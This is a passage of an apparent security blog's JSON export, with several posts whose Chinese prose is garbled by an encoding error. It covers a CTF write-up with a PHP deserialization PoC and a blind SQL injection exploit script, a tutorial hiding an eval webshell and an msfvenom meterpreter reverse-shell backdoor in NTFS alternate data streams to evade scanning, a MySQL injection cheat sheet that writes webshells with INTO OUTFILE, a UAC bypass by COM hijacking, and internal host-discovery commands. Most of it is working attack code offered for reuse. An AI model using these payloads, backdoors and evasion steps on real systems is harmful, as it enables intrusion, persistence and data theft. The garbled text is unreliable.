up","date":"2019-04-23T03:20:33.000Z","updated":"2019-07-13T03:00:54.526Z","comments":true,"path":"2019/04/23/Á¨¨ÂçÅ‰∫åÂ±äÂÖ®ÂõΩÂ§ßÂ≠¶Áîü‰ø°ÊÅØÂÆâÂÖ®Á´ûËµõÂàùËµõWrite up/","link":"","permalink":"http://patrilic.top/2019/04/23/Á¨¨ÂçÅ‰∫åÂ±äÂÖ®ÂõΩÂ§ßÂ≠¶Áîü‰ø°ÊÅØÂÆâÂÖ®Á´ûËµõÂàùËµõWrite up/","excerpt":"","text":"[toc] Web1 - JustSosoIndex.php12345678910111213141516171819202122&lt;?phperror_reporting(E_ALL);$payload = $_GET[\"payload\"];require $_GET['file'];if (isset($payload)) &#123; $url = parse_url($_SERVER['REQUEST_URI']); parse_str($url['query'], $query); foreach ($query as $value) &#123; if (preg_match(\"/flag/\", $value)) &#123; echo 'gg'; exit(); &#125; &#125; $payload = unserialize($payload);&#125; else &#123; echo \"Missing parameters\";&#125;?&gt; Hint.php1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253&lt;?phperror_reporting(E_ALL);class Handle&#123; private $handle; // ÁªïËøáwakeup public function __wakeup() &#123; foreach (get_object_vars($this) as $k =&gt; $v) &#123; $this-&gt;$k = null; &#125; echo \"Waking up\\n\"; &#125; public function __construct($handle) &#123; $this-&gt;handle = $handle; &#125; public function __destruct() &#123; $this-&gt;handle-&gt;getFlag(); &#125;&#125;class Flag&#123; public $file; public $token; public $token_flag; function __construct($file) &#123; $this-&gt;file = $file; $this-&gt;token_flag = $this-&gt;token = md5(rand(1, 10000)); &#125; public function getFlag() &#123; $this-&gt;token_flag = md5(rand(1, 10000)); if ($this-&gt;token === $this-&gt;token_flag) &#123; if (isset($this-&gt;file)) &#123; echo @highlight_file($this-&gt;file, true); &#125; &#125; &#125;&#125;?&gt; poc.php123456789101112&lt;?phprequire \"hint.php\";$flag = new Flag('flag.php');$flag-&gt;token = 'b706835de79a2b4e80506f582af3676a';$flag-&gt;token_flag = &amp;$flag-&gt;token;$handle = new Handle($flag);$s = serialize($handle);echo urlencode($s); parse_urlÁªïËøáÊ≠£Âàô:http://lawlietweb.com/2018/05/13/parse_url/wake_upÁªïËøá:https://paper.seebug.org/39/ Web2 - ÂÖ®ÂÆáÂÆôÊúÄÁÆÄÂçïÁöÑSQLËøáÊª§ or if sleep benchmarkÂèÇËÄÉbctf-love-qÂà©Áî®pow()Âú®Êù°‰ª∂‰∏∫ÂÅáÊó∂ËøîÂõûerror ËøêÁÆóÁ¨¶‰ΩúÊù°‰ª∂Âà§Êñ≠ÔºåÂ¶ÇÊûúÈîôËØØÊï∞ÊçÆÂ∫ìÊä•ÈîôÔºöÂà©Áî®powÁöÑÊ∫¢Âá∫Âà§Êñ≠limit‰ΩçÊï∞ÁöÑascii Âú®È¢òÁõÆ‰∏≠Ê≠£Á°ÆËøîÂõûÁôªÈôÜÂ§±Ë¥•ÔºåÈîôËØØËøîÂõûÊï∞ÊçÆÂ∫ìÂ§±Ë¥• Exp:1234567891011121314151617181920212223242526272829303132import requestsVERSION = \"version()\"USERNAME = \"select username from user limit 1\"PASSWORD = \"select (select e.2 from (select * from (select 1)a,(select 2)b union select * from user)e limit 1,1)\"url = \"http://cba0e34ee5d34db985195191f4c681d5c32c4b92db574826.changame.ichunqiu.com\"result = ''for i in range(1, 50): for j in range(31, 128): payload = &#123; \"username\": \"1'-pow(2,1024-ascii(substr((&#123;data&#125;),&#123;pos&#125;,1))+&#123;code&#125;)-- -\".format( data=PASSWORD, pos=i, code=j ), \"password\": \"1\" &#125; try: resp = requests.post(url=url, data=payload) resp.encoding = 'utf8' if 'Êï∞ÊçÆÂ∫ìÊìç‰ΩúÂ§±Ë¥•' in resp.text: result += chr(j) print(result) break except Exception as e: print(e) continue Âà©Áî®mysqlÂà´Âêç(ÂèÇËÄÉÂçöÂÆ¢‰∏≠Mysql Injection‰∏≠# ‰∏çÁî®ÂàóÂêçÁöÑÊ≥®ÂÖ•) Ë∑ëÂá∫password : F1AG@1s-at_/fll1llag_h3r3 ËøõÂÖ•ÂêéÂè∞‰∏∫ËøúÁ®ãÊï∞ÊçÆÂ∫ìËøûÊé•ÁïåÈù¢ÔºåÁêÜÊÉ≥Âà∞fake_mysqlServerËØªÊñá‰ª∂ÂèÇËÄÉÊñáÁ´†https://xz.aliyun.com/t/3973 ‰øÆÊîπËøô‰∏™ËÑöÊú¨ÈáåÁöÑfilelisthttps://github.com/allyshka/Rogue-MySql-Server/blob/master/rogue_mysql_server.py ÁÑ∂ÂêéËÆ©È¢òÁõÆÊúçÂä°Âô®ËøûÊé•Âç≥ÂèØ Web3 - lovemathÁõ¥Êé•Â´ñÈòüÂèã@hpdogerÁöÑwp orz ËØªÂà∞calc.phpÁöÑÊ∫êÁ†Å ÈªëÂêçÂçïËÇØÂÆöÊòØÁªï‰∏çËøáÂéªÔºåËôΩÁÑ∂Êúâ/m‰ΩÜÊòØ\\rÂú®ÈªëÂêçÂçïÊâÄ‰ª•‰∏çÂ≠òÂú®Êç¢Ë°åÁªïËøá„ÄÇÊ≥®ÊÑèÁúã‰∏ãÈù¢ÁöÑwhitelist„ÄÇÊ≠£ÂàôÂåπÈÖçÂáΩÊï∞ÂêçÔºåÂè™ÂÖÅËÆ∏Eval‰ΩøÁî®ÁôΩÂêçÂçïÁöÑÂáΩÊï∞ÂÅöÂ≠óÁ¨¶‰∏≤ÊâÄ‰ª•ÊÄùË∑ØÂ∞±ÂæàÊòéÁ°ÆÔºåÊó¢ÁÑ∂ÂèÇÊï∞‰ªéÁôΩÂêçÂçïÂá∫Êù•ÂêéË¢´ÊâßË°åÔºåÈÇ£ÊºèÊ¥ûÁÇπËÇØÂÆöÂ∞±Âú®ÁôΩÂêçÂçïÁöÑÂáΩÊï∞„ÄÇÁî±‰∫éÊ≠£ÂàôÂåπÈÖçÂ≠óÊØçÁöÑËßÑÂàôÔºå‰ΩøÊàë‰ª¨‰º†ÂÖ•ÁöÑÂÆûÂèÇ‰∏çËÉΩÊòØÂ≠óÊØçÔºåÂê¶ÂàôÂ∞±‰ºöËøõÂÖ•Âà§Êñ≠Â¶Ç‰∏ãÊÉ≥ÂäûÊ≥ïÊääÊï∞Â≠óÂèòÊàêÂ≠óÊØçÔºåÁùÄÁúº‰∫éÂáΩÊï∞base_convertÔºåÂÆòÊñπÊèèËø∞Â¶Ç‰∏ãÂÆÉÂÖÅËÆ∏Êàë‰ª¨Â∞Ü10ËøõÂà∂Êï∞ËΩ¨Êç¢‰∏∫ÊúÄÈ´ò36ËøõÂà∂ÔºåÁªìÊûú‰∏∫Â≠óÁ¨¶‰∏≤„ÄÇÂÆåÁæéËß£ÂÜ≥‰∫ÜÊï∞Â≠ó-&gt;Â≠óÊØçÁöÑËΩ¨ÂåñÔºåÊàêÂäüÊâìÂç∞PhpinfoÂ¶Ç‰∏ãÂõ†‰∏∫Â≠óÁ¨¶‰∏≤ÈïøÂ∫¶ÈôêÂà∂ÔºåÊàëÊúÄÂºÄÂßãÁöÑÊÉ≥Ê≥ïÊòØËøôÊ†∑ÁöÑÔºö12$input = hexdec(bin2hex(‚Äúsystem(‚Äòcat /flag‚Äô);‚Äù))$result = base_convert(10ËøõÂà∂ÁºñÁ†ÅÁöÑhex2bin,10,36).dechex($input) Â§±Ë¥•ÁöÑPOCÊòØËøôÊ†∑Ôºö1base_convert(37907361743,10,36)(dechex(9148825951463535960001056079872)) bin2hexÂêéÁî±‰∫éËΩ¨Êç¢Âá∫Êù•ÁöÑ16ËøõÂà∂Êï∞ÂÄºËøáÂ§ßÔºåÂØºËá¥ËΩ¨Êç¢ÁöÑintÂÄºÂæàÂ§ßÊó†Ê≥ïÊ≠£Â∏∏Ë¢´dechexËøòÂéüËÄåÊ∫¢Âá∫„ÄÇ Âç°Âú®ËøôÈáåÂæà‰πÖÔºåÊúÄÂêéÊç¢‰∫Ü‰∏ÄÁßçÂ∞èÊï∞ËøòÂéüÁöÑÊÄùË∑Ø„ÄÇ Êàë‰ª¨Âè™ÈúÄË¶ÅÊûÑÈÄ†_GET‰∏∫16ËøõÂà∂Êï∞ÔºåËøô‰∏™16ËøõÂà∂ËΩ¨Êç¢Âá∫Êù•ÁöÑÂçÅËøõÂà∂Â∞±‰∏ç‰ºöÂæàÂ§ßÔºåËá™ÁÑ∂Âú®dechex‰πü‰∏ç‰ºöÊ∫¢Âá∫„ÄÇ PayloadÂ¶Ç‰∏ãÔºåÊ≥®ÊÑèÁî®ÁôΩÂêçÂçïÁöÑÂÄº‰Ωú‰∏∫ÂèòÈáèÂèÇÊï∞ÔºåÂê¶ÂàôËøòÊòØ‰ºöË¢´Êã¶Êà™1$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi)&#123;0&#125;(($$p)&#123;1&#125;) ËΩ¨Êç¢ÁöÑË∞ÉÁî®Ê†àÂ¶Ç‰∏ãÔºö Áõ¥Êé•ÂèëÂåÖÁªôÂà∞CÂèÇÊï∞ÔºåÊàêÂäügetflag ËøòÂú®Áæ§ÈáåÁúãÂà∞‰∏Ä‰ΩçÂ∏àÂÇÖÁöÑPayload 1base_convert(47138,20,36)(base_convert(3761671484,13,36)(dechex(474260465194))) 1exec(nl f*); 79‰Ωç‚Ä¶‚Ä¶ orz","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://patrilic.top/tags/CTF/"}]},{"title":"ADSÈöêËóèÂêéÈó®","slug":"ADS ÈöêËóèÂêéÈó®","date":"2019-04-18T03:20:33.000Z","updated":"2019-07-13T03:00:46.271Z","comments":true,"path":"2019/04/18/ADS ÈöêËóèÂêéÈó®/","link":"","permalink":"http://patrilic.top/2019/04/18/ADS ÈöêËóèÂêéÈó®/","excerpt":"","text":"È´òÈìÅ‰∏äÊ≤°‰∫ãÂπ≤ÔºåÊää‰ª•ÂâçÁöÑÁ¨îËÆ∞ÊÄªÁªì‰∏Ä‰∏ã[toc] ADSNTFS‰∫§Êç¢Êï∞ÊçÆÊµÅÔºàalternate data streamsÔºåÁÆÄÁß∞ADSÔºâ ADSÊòØNTFSÁ£ÅÁõòÊ†ºÂºèÁöÑ‰∏Ä‰∏™ÁâπÊÄßÔºåÂú®NTFSÊñá‰ª∂Á≥ªÁªü‰∏ãÔºåÊØè‰∏™Êñá‰ª∂ÈÉΩÂèØ‰ª•Â≠òÂú®Â§ö‰∏™Êï∞ÊçÆÊµÅÔºåÂ∞±ÊòØËØ¥Èô§‰∫Ü‰∏ªÊñá‰ª∂ÊµÅ‰πãÂ§ñËøòÂèØ‰ª•ÊúâËÆ∏Â§öÈùû‰∏ªÊñá‰ª∂ÊµÅÂØÑÂÆøÂú®‰∏ªÊñá‰ª∂ÊµÅ‰∏≠„ÄÇÂÆÉ‰ΩøÁî®ËµÑÊ∫êÊ¥æÁîüÊù•Áª¥ÊåÅ‰∏éÊñá‰ª∂Áõ∏ÂÖ≥ÁöÑ‰ø°ÊÅØÔºåËôΩÁÑ∂Êàë‰ª¨Êó†Ê≥ïÁúãÂà∞Êï∞ÊçÆÊµÅÊñá‰ª∂Ôºå‰ΩÜÊòØÂÆÉÂç¥ÊòØÁúüÂÆûÂ≠òÂú®‰∫éÊàë‰ª¨ÁöÑÁ≥ªÁªü‰∏≠ÁöÑ„ÄÇÂàõÂª∫‰∏Ä‰∏™Êï∞ÊçÆ‰∫§Êç¢ÊµÅÊñá‰ª∂ÁöÑÊñπÊ≥ïÂæàÁÆÄÂçïÔºåÂëΩ‰ª§‰∏∫‚ÄùÂÆø‰∏ªÊñá‰ª∂:ÂáÜÂ§á‰∏éÂÆø‰∏ªÊñá‰ª∂ÂÖ≥ËÅîÁöÑÊï∞ÊçÆÊµÅÊñá‰ª∂‚Äù„ÄÇ ‚Äî‚Äì baike.baidu.com Êñá‰ª∂ÂëΩÂêçÔºö ads.txt ÊôÆÈÄötxtÊñá‰ª∂ (‰∏ªÊñá‰ª∂)ads.txt:nop.txt ÔºàÂØÑÂÆøÊñá‰ª∂Ôºâ ‰ΩøÁî®dirÂëΩ‰ª§‰∏çËÉΩÁúãÂà∞ÔºåÂøÖÈ°ª‰ΩøÁî®dir /r WebshellÔºàËøáDÁõæÔºâ1C:\\phpStudy\\PHPTutorial\\WWW\\webshell&gt;echo \"&lt;?php phpinfo();?&gt;\" &gt; index.php:s.txt Â∞Ü Â∞èÈ©¨ÂÜôÂÖ•index.php:s.txt‰∏≠ ÔºåÁÑ∂ÂêéÂÜçindex.php‰∏≠includeDÁõæ‰∏çËÉΩËé∑ÂèñÈùû‰∏ªÊñá‰ª∂ÊµÅ1234567index.php&lt;?php $a=&quot;696e6465782e70&quot;.&quot;68703a732e747874&quot;; $b=&quot;a&quot;; include(PACK(&apos;H*&apos;,$$b))?&gt; 123index.php:s.txt&lt;?php @eval($_POST[&apos;chopper&apos;]);?&gt; ÊµãËØï0x01 ÁéØÂ¢É12MacOS ipaddress: 192.168.43.223Windows 10 ipaddress: 192.168.121.132 0x02 ÁîüÊàêshell1msfvenom --platform Windows -p windows/meterpreter/reverse_tcp lhost=192.168.1.101 lport=8888 -f exe -o shell.exe 0x03 Ê§çÂÖ•ÂêéÈó®ÁéØÂ¢ÉÊèèËø∞ÔºöÊãøÂà∞‰∫ÜwebshellÔºåÁªèËøáÊèêÊùÉÔºåÊùÉÈôê‰∏∫Êú¨Âú∞ÁÆ°ÁêÜÂëò‰∏ä‰º†‰∏Ä‰∏™ÂêéÈó®Êñá‰ª∂ ‰ΩøÁî®typeÂ∞Üshell.exeÊï∞ÊçÆÂÜôÂÖ•‰æùÈôÑÂú®hello.txt‰∏ä 1mklink \"c:\\backdoor\\link.exe\" \"c:\\backdoor\\hello.txt:shell.exe\" server 2k3Âêé‰∏çËÉΩÁõ¥Êé•ÊâßË°åexeÔºåÂøÖÈ°ªÂª∫Á´ãÈìæÊé•1start link.exe /b ÊàêÂäüÂõûÂºπsession Thankshttps://docs.microsoft.com/en-us/previous-versions/ms854468(v=msdn.10)https://klionsec.github.io/2017/11/13/ntfs-streams/https://blog.csdn.net/migee/article/details/56028011https://blog.csdn.net/xiaoxuetu_/article/details/77318670","categories":[],"tags":[{"name":"Backdoor","slug":"Backdoor","permalink":"http://patrilic.top/tags/Backdoor/"}]},{"title":"MySQL InjectionÔºàÊåÅÁª≠Êõ¥Êñ∞Ôºâ","slug":"MySQL Injection","date":"2019-04-14T15:20:33.000Z","updated":"2019-07-13T03:01:16.542Z","comments":true,"path":"2019/04/14/MySQL Injection/","link":"","permalink":"http://patrilic.top/2019/04/14/MySQL Injection/","excerpt":"","text":"[toc] HeaderÊÄªÁªì‰∏ÄÊ≥¢MySQL‰∏ãÂêÑÂºèÂêÑÊ†∑Á≠âÊ≥®ÂÖ•ÊäÄÂ∑ßÔΩûTest Machine Configuration OSÔºöMacOS Mojave 10.14.2MySQL: MySQL 5.7.19-log ÊµãËØïË°®ÁªìÊûÑÔºö limitEmmmmÔºåÊµãËØïÂ§±Ë¥•‰∫ÜÁøª‰∫Ü‰∏Ä‰∫õÊñáÁ´†ÔºåÂèëÁé∞limit‰πãÂêéÁöÑanalyse() Âè™ÈÄÇÁî®‰∫éMySQL server version &lt;= 5.6.6 ÈÅÇ‰ΩøÁî® Windows7 x64 + MySQL 5.5.53 ÊµãËØïËØ≠Âè•1SELECT username FROM user LIMIT &#123;$uid&#125;,3; Limit Ê≥®ÂÖ•‰∏ªË¶ÅÊòØÂõ†‰∏∫ÂêéÈù¢Êúâ‰∏Ä‰∏™ PROCEDURE analyse() Â≠òÂÇ®ËøáÁ®ã ÊûÑÈÄ†Êä•ÈîôÊ≥®ÂÖ•1SELECT username FROM user LIMIT 1,3 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1); Âõ†‰∏∫5.5ÁâàÊú¨‰∏çËÉΩ‰ΩøÁî®SELECTÔºåÊâÄ‰ª•Âè™ËÉΩËé∑Âèñ‰∏Ä‰∫õÈÖçÁΩÆ‰ø°ÊÅØÁ≠â exp123SELECT username FROM user LIMIT 1,3 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1);SELECT field FROM table WHERE id &gt; 0 ORDER BY id LIMIT 1,1 PROCEDURE analyse((select extractvalue(rand(),concat(0x3a,(IF(MID(version(),1,1) LIKE 5, BENCHMARK(5000000,SHA1(1)),1))))),1) order byÊµãËØïËØ≠Âè•Ôºö1SELECT * FROM user order by uid &#123;evil&#125;; Order by + Êä•ÈîôÊ≥®ÂÖ• order by + Êó∂Èó¥Áõ≤Ê≥® order by + unionÊü•ËØ¢ Ê≠§Ê≥®ÂÖ•ÂøÖÈ°ª‰ΩøÁî®()ÂåÖÂõ¥SQLËØ≠Âè• order by + regexp Áõ≤Ê≥® ËøôÈáåËß£Èáä‰∏Ä‰∏ãËØ≠Âè•ÂΩìÊ≠£ÂàôÊú™ÂåπÈÖçÂà∞Êï∞ÊçÆÊó∂ÂÄôËøîÂõûÁöÑÁªìÊûúÊòØ0 ÊâÄ‰ª•SQLËØ≠Âè•Áõ∏ÂΩì‰∫é1select * from user order by uid ^ 0; ÊéíÂ∫è‰∏çÂèòexp123456789SELECT * FROM user ORDER BY uid and extractvalue(1,concat(0x3a,user()));SELECT * FROM user ORDER BY uid and updatexml(1,concat(0x3a,user()),1);select * from user order by uid ^(select (select version()) regexp '^aaaaaa');select * from user order by uid,(select 1 from (select sleep(3))a);(select * from user order by uid) union (select 1,(select version()),3,4); fromÊµãËØïËØ≠Âè•1SELECT * FROM &#123;$Tables&#125;; Áõ¥Êé•ÂµåÂ•óÂ≠êÊü•ËØ¢ expÁâàÊú¨ÈôêÂà∂Ôºö Version &lt;= 5.5.5123select exp(~(select*from(select user())x));insert into users (id, username, password) values (2, '' ^ exp(~(select*from(select user())x)), 'patrilic'); ExtractValue1Select * from user where uid = 1 and (extractvalue('String',(select user()))); extractvalue(target fileÔºåxml path) UpdateXml1Select * from user where uid = 1 and (updatexml('String',(Select user()),'String')); updatexml(Target fileÔºåxml pathÔºåupdateinfo) name_const1Select * from user where uid = 1 and (select name_const(version(),1),name_const(version(),1)); name_const(‚Äò1‚Äô, 14)Â±ÄÈôêÊÄßÂæàÂ§ß Êï¥Êï∞Ê∫¢Âá∫Êä•ÈîôÊ≥®ÂÖ•Áï• insert1Insert INTO user (uid,username,password,city) VALUES (?,?,?,?); delect1DELETE FROM user WHERE uid=&#123;$uid&#125;; update1UPDATE user SET password = &#123;$password&#125; Where username = &#123;session.user&#125; and uid = &#123;session.uid&#125; into outfile‰∏ªË¶ÅÁî®ÈÄîÔºöÂÜôshellË¶ÅÊ±ÇÔºö Ë¶ÅÊ±ÇÁî®Êà∑ÂÖ∑ÊúâfileÊùÉÈôê Êñá‰ª∂‰∏çËÉΩË¶ÜÁõñÂÜôÂÖ•ÔºåÊâÄ‰ª•Êñá‰ª∂ÂøÖÈ°ª‰∏∫‰∏çÂ≠òÂú® Â¶ÇÊûúsecure_file_privÈùûÁ©∫ÔºåÂàôÂÜôÂÖ•Êñá‰ª∂ÁöÑÁõÆÂΩïÂè™ËÉΩ‰∏∫ÂØπÂ∫îÁõÆÂΩï‰∏ã into outfile + UNION 1SELECT * FROM user WHERE uid = -1 union select 1,2,3,0x3c3f70687020706870696e666f28293b3f3e into outfile 'Y:/123.php'; into outfile + LINES TERMINATED BY (limit)1select * from user order by uid limit 1,1 into outfile 'Y:/123.php' LINES TERMINATED BY 0x3c3f70687020706870696e666f28293b3f3e; into outfile + FIELDS TERMINATED BY (limit)1select * from user order by uid limit 1,1 into outfile 'Y:/123.php' fields terminated by 0x3c3f70687020706870696e666f28293b3f3e; into outfile + LINES STARTING BY (limit)1select * from user order by uid limit 1,1 into outfile 'Y:/123.php' LINES TERMINATED BY 0x3c3f70687020706870696e666f28293b3f3e; load_file‰∏ªË¶ÅÁî®ÈÄîÔºöËØªÊñá‰ª∂Ë¶ÅÊ±ÇÔºö Ë¶ÅÊ±ÇÁî®Êà∑ÂÖ∑ÊúâfileÊùÉÈôê Â¶ÇÊûúsecure_file_privÈùûÁ©∫ÔºåÂàôÂè™ËÉΩËØªÂèñÂØπÂ∫îÁõÆÂΩï‰∏ãÁöÑÊñá‰ª∂ load_file + UNION 1select * from user where uid = -1 union select 1,2,3,(select load_file('Y:/123.php')); load_file + updatexml1select * from user where username = '' and updatexml(0,concat(0x7e,(LOAD_FILE('Y:/123.php')),0x7e),0); load_file + extractive1select * from user where uid=-1 and (extractvalue(1,concat(0x7e,(select (LOAD_FILE('Y:/1.php'))),0x7e))); load_file + isnull + updatexml1select * from user where username = '' and updatexml(0,concat(0x7e,isnull(LOAD_FILE('D:/1.php')),0x7e),0); Â≠òÂú®Êñá‰ª∂ ËøîÂõû0‰∏çÂ≠òÂú®Êñá‰ª∂ ËøîÂõû1 Dumpfile1SELECT _utf8'Hello world!' INTO DUMPFILE 'Y:/world.php'; Case When PowËøêÁÆóÁ¨¶‰ΩúÊù°‰ª∂Âà§Êñ≠ÔºåÂ¶ÇÊûúÈîôËØØÊï∞ÊçÆÂ∫ìÊä•ÈîôÔºöÂà©Áî®powÁöÑÊ∫¢Âá∫Âà§Êñ≠limit‰ΩçÊï∞ÁöÑascii In ‰∏çÁü•ÈÅìÂàóÂêçÁöÑÊ≥®ÂÖ•ÁúãÂéüÊñáÊØîËæÉÂ•ΩÔºåÁõ¥Êé•Â§çÁé∞‰∏Ä‰∏ã ThanksMySQLi Cookbooklcamry‚Äôs blogÊä•ÈîôÊ≥®ÂÖ•ÈÇÇÈÄÖload_file&amp;into outfileÊê≠ËÆ™LINESsqli-extracting-data-without-knowing-columns-namewangyihang-sqli-labs-ScriptÂè≤‰∏äÊúÄÊ∞¥ÁöÑMYSQLÊ≥®ÂÖ•ÊÄªÁªì","categories":[],"tags":[{"name":"SQLÊ≥®ÂÖ•","slug":"SQLÊ≥®ÂÖ•","permalink":"http://patrilic.top/tags/SQLÊ≥®ÂÖ•/"}]},{"title":"bypassUAC_via_comhijacking","slug":"bypassUAC_via_comhijacking","date":"2019-04-03T05:12:49.000Z","updated":"2019-07-13T03:00:42.225Z","comments":true,"path":"2019/04/03/bypassUAC_via_comhijacking/","link":"","permalink":"http://patrilic.top/2019/04/03/bypassUAC_via_comhijacking/","excerpt":"","text":"0x01 ComÂä´ÊåÅÂéüÁêÜÂà©Áî®CLSIDÊêúÁ¥¢È°∫Â∫èÔºö HKCU\\Software\\Classes\\CLSID HKCR\\CLSID HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\ShellCompatibility\\Objects\\ Â∞ÜË¢´Âä´ÊåÅÁöÑCLSIDÂ≠òÂÖ•ÔºöHKCU\\Software\\Classes\\CLSID CLSID ÁªìÊûÑ1234HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\CLSID &#123;CLSID&#125; InprocServer32 (Default) = path ThreadingModel = value 0x02 uacbypass_comhijackÂàÜÊûêÂà§Êñ≠Á≥ªÁªüÁâàÊú¨ 1234567def check if sysinfo['OS'] =~ /Windows (7|8|10|2008|2012|2016)/ &amp;&amp; is_uac_enabled? # ‰ªémeterpreter‰∏≠Âà§Êñ≠OSÁâàÊú¨ Exploit::CheckCode::Appears else Exploit::CheckCode::Safe end end Âä´ÊåÅÁÇπÔºöeventvwr.exe Âíå mmc.exe12345678910111213@@hijack_points = [ &#123; name: 'Event Viewer', cmd_path: '%WINDIR%\\System32\\eventvwr.exe', class_ids: ['0A29FF9E-7F9C-4437-8B11-F424491E3931'] &#125;, &#123; name: 'Computer Managment', cmd_path: '%WINDIR%\\System32\\mmc.exe', cmd_args: 'CompMgmt.msc', class_ids: ['0A29FF9E-7F9C-4437-8B11-F424491E3931'] &#125; ] 123456789101112131415161718192021222324def hijack_com(registry_view, dll_path) target = @@hijack_points.sample target_clsid = target[:class_ids].sample root_key = \"#&#123;CLSID_PATH&#125;\\\\&#123;#&#123;target_clsid&#125;&#125;\" inproc_key = \"#&#123;root_key&#125;\\\\InProcServer32\" shell_key = \"#&#123;root_key&#125;\\\\ShellFolder\" registry_createkey(root_key, registry_view) registry_createkey(inproc_key, registry_view) registry_createkey(shell_key, registry_view) registry_setvaldata(inproc_key, DEFAULT_VAL_NAME, dll_path, 'REG_SZ', registry_view) registry_setvaldata(inproc_key, 'ThreadingModel', 'Apartment', 'REG_SZ', registry_view) registry_setvaldata(inproc_key, 'LoadWithoutCOM', '', 'REG_SZ', registry_view) registry_setvaldata(shell_key, 'HideOnDesktop', '', 'REG_SZ', registry_view) registry_setvaldata(shell_key, 'Attributes', 0xf090013d, 'REG_DWORD', registry_view) &#123; name: target[:name], cmd_path: target[:cmd_path], cmd_args: target[:cmd_args], root_key: root_key &#125; end ÂêëÊ≥®ÂÜåË°®Ê∑ªÂä† HKCU\\Software\\Classes\\CLSID{0A29FF9E-7F9C-4437-8B11-F424491E3931}\\InProcServer32HKCU\\Software\\Classes\\CLSID{0A29FF9E-7F9C-4437-8B11-F424491E3931}\\ShellFolder InProcServer ‰∏≠Ôºö Default -&gt; dll_path ThreadingModel -&gt; Apartment LoadWithoutCOM -&gt; Null ShellFolder ‰∏≠Ôºö HideOnDesktop -&gt; Null Attributes -&gt; 0xf090013d 0x03 Â§çÁé∞1msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=10.131.36.131 lport=4444 -f exe &gt; out.exe ÂõûÂºπÊãøÂà∞meterpreter session Êó†Ê≥ïgetsystem ÂèØ‰ª•ÁúãÂà∞ÔºåÂä´ÊåÅ‰∫ÜCLSID {0A29FF9E-7F9C-4437-8B11-F424491E3931}ÁöÑ‰ºöËØùÔºåÊàêÂäüÊãøÂà∞ÂèçÂºπsession","categories":[],"tags":[{"name":"ÂÜÖÁΩëÊ∏óÈÄè","slug":"ÂÜÖÁΩëÊ∏óÈÄè","permalink":"http://patrilic.top/tags/ÂÜÖÁΩëÊ∏óÈÄè/"}]},{"title":"ÂÜÖÁΩë‰∏ªÊú∫ÂèëÁé∞","slug":"ÂÜÖÁΩë‰∏ªÊú∫ÂèëÁé∞","date":"2019-04-03T03:59:32.000Z","updated":"2019-07-13T03:00:50.225Z","comments":true,"path":"2019/04/03/ÂÜÖÁΩë‰∏ªÊú∫ÂèëÁé∞/","link":"","permalink":"http://patrilic.top/2019/04/03/ÂÜÖÁΩë‰∏ªÊú∫ÂèëÁé∞/","excerpt":"","text":"[toc] 0x01 ÂèëÁé∞ÂÜÖÁΩëÂ≠òÊ¥ª‰∏ªÊú∫1.1 Âü∫‰∫éARPÂèëÁé∞ÂÜÖÁΩë‰∏ªÊú∫nmap1nmap -sn -PR 10.253.6.0/24 powershell1C:\\Users\\Patrilic\\Desktop&gt;powershell -exec bypass -Command &quot;Import-Module ./Invoke-ARPScan.ps1;Invoke-ARPScan -CIDR 192.168.121.1/24&quot; Invoke-ARPScan ÊòØEmpire‰∏≠ÁöÑÊ®°Âùó arp-scan.exe1C:\\Users\\Patrilic\\Desktop&gt;arp-scan.exe -t 192.168.121.0/24 arp-ping.exe1C:\\Users\\Patrilic\\Desktop&gt;arp-ping.exe 192.168.121.1 Empirenetdiscover1netdiscover -r 192.168.3.0/24 -i eth0 meterpreter12meterpreter &gt; getsystemmeterpreter &gt; run post/windows/gather/arp_scanner RHOSTS=10.253.6.1/24 CainÁ≠â1.2 Âü∫‰∫éicmpÂèëÁé∞‰∏ªÊú∫cmd1C:\\Users\\Patrilic\\Desktop&gt;for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.121.%I | findstr \"TTL=\" nmap1nmap -sn -PE 192.168.3.0/24 powershell1powershell.exe -exec bypass -Command \"Import-Module C:\\Invoke-TSPingSweep.ps1;Invoke-TSPingSweep -StartAddress 192.168.3.1 -EndAddress 192.168.3.254 -ResolveHost -ScanPort -Port 21,22,23,25,53,80,81,82,83,84,85,86,87,88,89,110,111,143,389,443,445,873,1025,1433,1521,2601,3306,3389,3690,5432,5900,7001,8000,8080,8081,8082,8083,8084,8085,8086,8087,8089,9090,10000\" bash1234567for ip in 10.131.36.&#123;1..254&#125; do ping $ip -c 1 &amp;&gt; /dev/null if [ $? -eq 0 ];then echo $ip is alive .... fi done 1.3 Âü∫‰∫énetbiosÂçèËÆÆÂèëÁé∞‰∏ªÊú∫cmd1nbtstat -n nbtscan1nbtscan-1.0.35.exe -m 192.168.121.0/24 nmap1nmap -sU --script nbstat.nse -p137 192.168.1.0/24 -T4 1.4 Âü∫‰∫ésmbÂçèËÆÆÂèëÁé∞‰∏ªÊú∫nmap1nmap ‚ÄêsU ‚ÄêsS ‚Äê‚Äêscript smb‚Äêenum‚Äêshares.nse ‚Äêp445 192.168.1.119/24 cmd1for /l %a in(1,1,254) do start /min /low telnet 192.168.1.%a 445 powershell12445|%&#123;echo((new‚ÄêobjectNet.Sockets.TcpClient).Connect(\"10.253.6\",$_)) \"$_ is open\"&#125; 2&gt;$null 11..5|%&#123;$a=$_;445|%&#123;echo((new‚Äêobject Net.Sockets.TcpClient).Connect(\"192.168.1.$a\",$_)) \"Port $_ is open\"&#125; 2&gt;$null&#125; 1118..119|%&#123;$a=$_;write‚Äêhost\"‚Äê‚Äê‚Äê‚Äê‚Äê‚Äê\";write‚Äêhost \"192.168.1.$a\"; 80,445 | % &#123;echo ((new‚Äêobject Net.Sockets.TcpClient).Con ect(\"192.168.1.$a\",$_)) \"Port $_ is open\"&#125; 2&gt;$null&#125; 1.5 Âü∫‰∫ésnmpÂèëÁé∞‰∏ªÊú∫nmap1nmap -sU --script snmp-brute 192.168.1.0/24 -T4 perlhttps://github.com/dheiland-r7/snmp 1.6 Âü∫‰∫éudpÂèëÁé∞‰∏ªÊú∫nmap1nmap -sU -T5 -sV --max-retries 1 192.168.1.100 -p 500 unicornscan1unicornscan -mU 192.168.1.100 1.7 